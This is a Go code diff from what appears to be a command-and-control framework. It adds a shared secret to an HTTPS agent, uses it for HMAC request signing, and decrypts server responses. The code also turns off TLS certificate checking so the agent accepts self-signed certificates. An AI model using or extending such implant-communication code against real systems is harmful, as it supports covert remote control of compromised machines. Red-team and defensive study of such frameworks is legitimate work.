@@ -8,17 +8,19 @@ import (
 	"io"
 	"net/http"
 
+	"c2framework/internals/crypto"
 	"c2framework/internals/server"
 )
 
 // HTTPSAgent implements the Agent interface for HTTPS
 type HTTPSAgent struct {
 	serverAddr string
-	client     *http.Client
+	client       *http.Client
+	sharedSecret string
 }
 
 // NewHTTPSAgent creates a new HTTPS agent
-func NewHTTPSAgent(serverIP string, serverPort string) *HTTPSAgent {
+func NewHTTPSAgent(serverIP string, serverPort string, sharedSecret string) *HTTPSAgent {
 	// Create TLS config that accepts self-signed certificates
 	tlsConfig := &tls.Config{
 		InsecureSkipVerify: true,
@@ -33,7 +35,8 @@ func NewHTTPSAgent(serverIP string, serverPort string) *HTTPSAgent {
 
 	return &HTTPSAgent{
 		serverAddr: fmt.Sprintf("%s:%s", serverIP, serverPort),
-		client:     client,
+		client:       client,
+		sharedSecret: sharedSecret,
 	}
 }
 
@@ -52,7 +55,7 @@ func (c *HTTPSAgent) Send(ctx context.Context) (json.RawMessage, error) {
 	}
 
 	// Sign the request with HMAC
-	SignRequest(req, body)
+	SignRequest(req, body, c.sharedSecret)
 
 	// Send request
 	resp, err := c.client.Do(req)
@@ -78,9 +81,15 @@ func (c *HTTPSAgent) Send(ctx context.Context) (json.RawMessage, error) {
 		return nil, fmt.Errorf("reading response: %w", err)
 	}
 
+	// Decrypt the response
+	decrypted, err := crypto.Decrypt(string(respBody), c.sharedSecret)
+	if err != nil {
+		return nil, fmt.Errorf("decrypting response: %w", err)
+	}
+
 	// Unmarshal into HTTPSResponse to validate structure
 	var httpsResp server.HTTPSResponse
-	if err := json.Unmarshal(respBody, &httpsResp); err != nil {
+	if err := json.Unmarshal(decrypted, &httpsResp); err != nil {
 		return nil, fmt.Errorf("unmarshaling response: %w", err)
 	}
 
